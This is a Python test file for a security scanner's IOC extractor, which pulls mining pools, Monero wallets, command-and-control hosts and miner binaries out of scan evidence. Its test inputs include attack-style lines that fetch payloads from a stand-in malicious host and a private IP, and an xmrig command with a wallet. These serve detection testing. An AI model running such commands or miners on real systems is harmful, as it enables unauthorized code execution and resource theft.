"""Tests for IOC extraction and pool_owned_by_publisher."""

from __future__ import annotations

from knorr.scanning.iocs import extract_iocs, pool_owned_by_publisher

# ---------------------------------------------------------------------------
# extract_iocs
# ---------------------------------------------------------------------------

def test_extract_mining_pool():
    items = ["stratum+tcp://pool.supportxmr.com:3333"]
    iocs = extract_iocs(items)
    assert any("supportxmr" in p for p in iocs["pools"])


def test_extract_monero_wallet():
    # 95-char Monero mainnet address (valid base58 alphabet used by XMR)
    wallet = "43ZR6AzgXtE2B9HzNAFqTQE7ZdBCsTVWyTtQdHoPhQ6N3SPfJVzTkLrYgXaiqsS8jZ1jEkN3BCRVeJNqV6D3H5DmBb5HAxy"
    iocs = extract_iocs([wallet])
    assert wallet in iocs["wallets"]


def test_extract_wallet_flag():
    iocs = extract_iocs(["xmrig --wallet=48edfhQ3xa1nBCqMrPnLT6j2Z99s2V8dq5Fak9AyS3ZVXDE3mxKzMhNZ"])
    assert any("48edfh" in w for w in iocs["wallets"])


def test_extract_c2_host():
    iocs = extract_iocs(["curl http://malicious-host.xyz/payload.sh"])
    assert any("malicious-host.xyz" in h for h in iocs["c2"])


def test_extract_raw_ip_c2():
    iocs = extract_iocs(["wget http://10.0.0.55/stage2"])
    assert any("10.0.0.55" in h for h in iocs["c2"])


def test_github_repo_not_in_c2():
    iocs = extract_iocs(["curl https://github.com/user/project/raw/main/install.sh"])
    # github.com should not appear in c2 list
    assert not any(h == "github.com" for h in iocs["c2"])


def test_extract_miner_binary():
    iocs = extract_iocs(["ENTRYPOINT /usr/bin/xmrig --config=/etc/xmrig/config.json"])
    assert "xmrig" in iocs["miners"]


def test_extract_coin_monero():
    items = ["stratum+tcp://xmr.pool.com:3333", "48edfhQ3xa1nBCqMrPnLT6j2Z99s2V8dq5Fak9AyS3ZVXDE3mxKzMhNZ"]
    iocs = extract_iocs(items)
    assert iocs["coin"] is not None
    assert "Monero" in iocs["coin"]


def test_extract_from_dicts():
    items = [
        {"category": "cryptomining", "rule": "mining-pool",
         "evidence": "stratum+tcp://pool.hashvault.pro:80"},
        {"category": "cryptomining", "rule": "miner-binary", "evidence": "xmrig"},
    ]
    iocs = extract_iocs(items)
    assert iocs["miners"] == ["xmrig"]
    assert any("hashvault" in p for p in iocs["pools"])


def test_pool_not_a_script_file():
    """A path like curl -o get-pip.py should not appear as a pool."""
    iocs = extract_iocs(["curl -o get-pip.py https://bootstrap.pypa.io/get-pip.py"])
    assert not any(".py" in p for p in iocs["pools"])


def test_extract_empty():
    iocs = extract_iocs([])
    assert iocs["pools"] == []
    assert iocs["wallets"] == []
    assert iocs["c2"] == []
    assert iocs["miners"] == []
    assert iocs["coin"] is None


def test_extract_github_repo():
    iocs = extract_iocs(["git clone https://github.com/attacker/malware-repo"])
    assert any("attacker/malware-repo" in r for r in iocs["repos"])


# ---------------------------------------------------------------------------
# pool_owned_by_publisher
# ---------------------------------------------------------------------------

def test_pool_owned_by_publisher_true():
    iocs = {"pools": ["xmr.metal3d.org:3333"]}
    assert pool_owned_by_publisher(iocs, "metal3d") is True


def test_pool_owned_by_publisher_false():
    iocs = {"pools": ["pool.supportxmr.com:3333"]}
    assert pool_owned_by_publisher(iocs, "metal3d") is False


def test_pool_owned_by_publisher_none_publisher():
    iocs = {"pools": ["xmr.metal3d.org:3333"]}
    assert pool_owned_by_publisher(iocs, None) is False


def test_pool_owned_by_publisher_short_publisher():
    """Publisher names shorter than 4 chars are skipped (too ambiguous)."""
    iocs = {"pools": ["xmr.org:3333"]}
    assert pool_owned_by_publisher(iocs, "xmr") is False


def test_pool_owned_by_publisher_empty_pools():
    assert pool_owned_by_publisher({"pools": []}, "metal3d") is False
